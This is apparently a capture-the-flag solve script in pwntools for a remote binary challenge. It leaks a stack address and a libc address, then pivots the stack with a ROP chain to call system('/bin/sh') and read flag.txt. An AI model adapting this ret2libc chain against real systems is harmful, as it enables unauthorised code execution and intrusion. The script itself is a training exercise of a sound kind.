#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 30150
HOST = "chall.v1t.site"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x0000000000401259
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
pop_rdi = 0x0000000000401214
ret = pop_rdi + 1
puts_got = exe.got.puts
puts_plt = exe.plt.puts
main = exe.sym.main
vuln = exe.sym.vuln
leave_ret = 0x0000000000401259

# PAYLOAD
p.recvuntil(b'help: ')
stack_leak = int(p.recvuntil(b'\n', drop=True), 16)
log.info("Stack leak: " + hex(stack_leak))

payload = flat(
    b'a'*8,
    pop_rdi,
    puts_got,
    puts_plt,
    vuln
    )
payload = payload.ljust(0x60, b'\0')
payload += flat(
    stack_leak,
    leave_ret
    )
p.sendline(payload)
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - libc.sym.puts
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system

payload = flat(
    b'/bin/sh\0',
    pop_rdi,
    stack_leak - 0x40,
    ret,
    system
    )
payload = payload.ljust(0x60, b'\0')
payload += flat(
    stack_leak - 0x40,
    leave_ret
    )
p.sendline(payload)

p.sendline(b'cat flag.txt')

p.interactive()